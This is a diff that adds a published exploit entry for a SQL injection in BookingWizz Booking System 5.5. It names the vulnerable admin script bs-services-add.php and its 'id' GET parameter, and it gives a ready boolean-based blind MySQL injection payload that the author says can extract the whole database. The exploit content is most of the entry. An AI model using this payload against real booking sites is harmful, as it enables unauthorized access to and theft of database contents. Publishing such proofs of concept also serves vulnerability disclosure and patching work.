@@ -1,0 +1,24 @@
+# Exploit Title: BookingWizz Booking System 5.5 - 'bs-services-add.php' SQL Injection
+# Dork: N/A
+# Date: 27.05.2018
+# Exploit Author: Özkan Mustafa Akkuş (AkkuS)
+# Vendor Homepage: https://codecanyon.net/item/booking-system/87919
+# Version: 5.5
+# Category: Webapps
+# Tested on: Kali linux
+# Description : The service editing on the admin panel is vulnerable.
+An attacker can exploit the entire database using this vulnerable in the
+'id' parameter.
+====================================================
+
+# PoC : SQLi :
+
+http://www.site.com/booking/bs-services-add.php?id=2
+
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: MySQL >= 5.0 boolean-based blind - Parameter replace
+    Payload: id=(SELECT (CASE WHEN (6769=6769) THEN 6769 ELSE 6769*(SELECT
+6769 FROM INFORMATION_SCHEMA.PLUGINS) END))
+
+====================================================
